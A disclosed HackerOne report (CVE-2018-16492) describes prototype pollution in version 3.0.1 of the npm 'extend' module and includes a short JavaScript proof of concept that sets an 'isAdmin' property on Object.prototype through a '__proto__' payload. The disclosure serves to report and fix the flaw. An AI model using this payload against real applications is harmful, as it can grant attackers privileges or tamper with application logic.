# [C] Prototype pollution attack (extend)

## Summary
Severity: Critical (CVSS 9.3)
Program: Node.js third-party modules
Weakness: Uncontrolled Resource Consumption
Reporter: asgerf
State: resolved
Disclosed: 2018-08-22T07:48:35.622Z
CVE: CVE-2018-16492
Source: https://hackerone.com/reports/381185

## Details
I would like to report prototype pollution in extend
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** extend
**version:** 3.0.1
**npm page:** `https://www.npmjs.com/package/extend`

## Module Description

`node-extend` is a port of the classic extend() method from jQuery. It behaves as you expect. It is simple, tried and true.

> **Note**: The github project is called `node-extend` but the NPM package is just `extend`

## Module Stats

7M downloads in the last week

# Vulnerability
## Vulnerability Description

This is a variant of this vulnerability:
https://hackerone.com/reports/310443

The `extend` function can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:

Craft an object of form `{__proto__: {...}}` and send it to `extend(true, {}, ...)`.

```javascript
let extend = require('extend');
let payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
extend(true, {}, payload);
console.log({}.isAdmin); // true
```


_Trimmed to 38 lines — full report: https://hackerone.com/reports/381185_
